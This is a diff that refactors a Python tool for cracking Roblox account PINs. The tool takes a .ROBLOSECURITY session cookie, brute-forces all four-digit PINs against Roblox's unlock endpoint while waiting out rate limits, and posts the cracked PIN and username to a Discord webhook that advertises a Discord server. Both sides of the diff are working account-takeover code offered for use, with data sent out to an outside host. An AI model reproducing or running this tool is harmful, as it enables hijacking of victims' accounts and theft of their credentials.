@@ -1,76 +1,67 @@
-import requests
-import re
-import string
-import time
-import os
+import requests, time,  os
 
-pingEveryone = True
-print('')
-print('Enter your cookie below:')
-cookie = input()
-os.system("cls")
-print('')
-print('Enter your webhook below:')
-webhook = input()
-os.system("cls")
-print('')
-print('Should we ping Everyone?: ( y / n )')
-pingEveryone = input()
-os.system("cls")
-if pingEveryone.lower == 'y' or pingEveryone == 'yes':
-    ping = '@everyone'
-else:
-    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
-os.system("cls")
+def user_input(question:str) -> str:
+    print('')
+    _input = input(question)
+    os.system('cls')
+    return _input
 
-print('''Cracker Has Started.''')
+def is_valid_cookie(cookie:str) -> bool:
+    response = requests.get("https://users.roblox.com/v1/users/authenticated", cookies = {".ROBLOSECURITY":cookie}).text
+    return not "Authorization has been denied for this request." in response
 
-url = 'https://auth.roblox.com/v1/account/pin/unlock'
-token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
-xcrsf = (token.headers['x-csrf-token'])
-header = {'X-CSRF-TOKEN': xcrsf}
+def crack_pin(cookie) -> int:
+    URL = 'https://auth.roblox.com/v1/account/pin/unlock'
+    response = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
+    xcrsf = (response.headers['x-csrf-token'])
+    header = {'X-CSRF-TOKEN': xcrsf}
 
-i = 0
-
-for i in range(9999):
-    try:
+    for i in range(9999):
         pin = str(i).zfill(4)
-        payload = {'pin': pin}
-        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
-        if 'unlockedUntil' in r.text:
-            print(f'Pin Cracked! Pin: {pin}')
-            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
-            data = {
-                "content" : ping,
-                "username" : "kunai;",
-                "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
-            }
-            data["embeds"] = [
-                {
-                    "description" : f"{username}\'s Pin:\n```{pin}```",
-                    "title" : "Cracked Pin!",
-                    "color" : 0x00ffff,
-                }
-            ]
+        response = requests.post(URL, data = {'pin':pin}, headers = header, cookies = {".ROBLOSECURITY":cookie}).text
 
-            result = requests.post(webhook, json = data)
-            input('Press any key to exit')
-            break
+        if 'unlockedUntil' in response:
+            print(f'Pin Cracked! Pin: {pin}')
             
-        elif 'Too many requests made' in r.text:
-                
-            print('  Ratelimited, trying again in 60 seconds..')
+            return pin
+
+        elif 'Too many requests made' in response:        
+            print('Ratelimited, trying again in 60 seconds..')
             time.sleep(60)
-                
-        elif 'Authorization' in r.text:
-                
-            print('  Error! Is the cookie valid?')
-            break
-            
-        elif 'Incorrect' in r.text:
-            print(f"  Tried: {pin} , Incorrect!")
-            time.sleep(10)  
-    except:
-        print('  Error!')
+    return -1
+
+def send_embed(cookie, webhook, ping_everyone, pin) -> None:
+    username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
+
+    if ping_everyone == 'y':
+        ping = '@everyone'
+
+    data = {
+        "content" : f"{ping} **https://discord.gg/kunai**",
+        "username" : "kunai;",
+        "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
+    }
+    data["embeds"] = [
+        {
+            "description" : f"{username}\'s Pin:\n```{pin}```",
+            "title" : "Cracked Pin!",
+            "color" : 0x00ffff,
+        }
+    ]
+
+    requests.post(webhook, json = data)
+
+if __name__ == '__main__':
     
-input('\n  Press any key to exit')
+    cookie = user_input('Enter your cookie below:')
+    if not is_valid_cookie(cookie):
+        print("Cookie is invalid.")
+        exit()
+
+    webhook = user_input('Enter your webhook below:')
+    ping_everyone = user_input('Should we ping Everyone?: ( y / n )').lower()
+    pin = crack_pin(cookie)
+    if pin != -1:
+        send_embed(cookie, webhook, ping_everyone, pin)
+
+    input('\nPress any key to exit')
